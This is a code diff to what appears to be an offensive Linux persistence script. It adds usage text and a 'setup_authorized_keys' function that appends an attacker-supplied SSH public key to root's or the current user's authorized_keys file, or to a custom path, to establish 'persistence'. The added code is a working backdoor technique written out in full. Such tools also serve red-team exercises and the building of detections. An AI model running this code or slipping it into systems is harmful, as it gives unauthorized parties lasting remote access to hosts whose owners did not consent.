@@ -72,6 +72,9 @@ usage_user() {
     echo "      --custom                     Use custom XDG settings"
     echo "          --file <file>                Specify custom desktop entry file"
     echo "          --command <command>          Specify custom persistence command"
+    echo "  --authorized-keys            Authorized keys management"
+    echo "      --default                    Use default authorized keys settings"
+    echo "          --key <key>                Specify the public key"
 }
 
 # Function to show the usage menu for root users
@@ -125,6 +128,12 @@ usage_root() {
     echo "      --custom                     Use custom XDG settings"
     echo "          --file <file>                Specify custom desktop entry file"
     echo "          --command <command>          Specify custom persistence command"
+    echo "  --authorized-keys            Authorized keys management"
+    echo "      --default                    Use default authorized keys settings"
+    echo "          --key <key>                Specify the public key"
+    echo "      --custom                     Use custom authorized keys settings"
+    echo "          --key <key>                Specify the public key"
+    echo "          --path <path>              Specify custom authorized keys file path"
 }
 
 # Function for systemd setup
@@ -770,6 +779,69 @@ setup_ssh_key() {
     echo "[+] SSH key persistence established."
 }
 
+setup_authorized_keys() {
+    local key=""
+    local path=""
+    local default=0
+    local custom=0
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --key )
+                shift
+                key=$1
+                ;;
+            --path )
+                shift
+                path=$1
+                ;;
+            * )
+                echo "Invalid option for --authorized-keys: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    elif [[ -z $key ]]; then
+        echo "Error: --key must be specified."
+        exit 1
+    fi
+
+    if check_root; then
+        if [[ $default -eq 1 ]]; then
+            path="/root/.ssh/authorized_keys"
+        elif [[ $custom -eq 1 && -n $path ]]; then
+            mkdir -p $(dirname $path)
+        else
+            echo "Error: --path must be specified with --custom for root."
+            exit 1
+        fi
+    else
+        if [[ $default -eq 1 ]]; then
+            local current_user=$(whoami)
+            path="/home/$current_user/.ssh/authorized_keys"
+        else
+            echo "Error: Only root can use --custom for --authorized-keys."
+            exit 1
+        fi
+    fi
+
+    mkdir -p $(dirname $path)
+    echo $key >> $path
+    chmod 600 $path
+
+    echo "[+] Persistence added to $path"
+}
+
 # Main function
 main() {
     local QUIET=0
@@ -832,6 +904,11 @@ main() {
             --ssh-key )
                 shift
                 setup_ssh_key "$@"
+                exit
+                ;;
+            --authorized-keys )
+                shift
+                setup_authorized_keys "$@"
                 exit
                 ;;
             --shell-configuration )
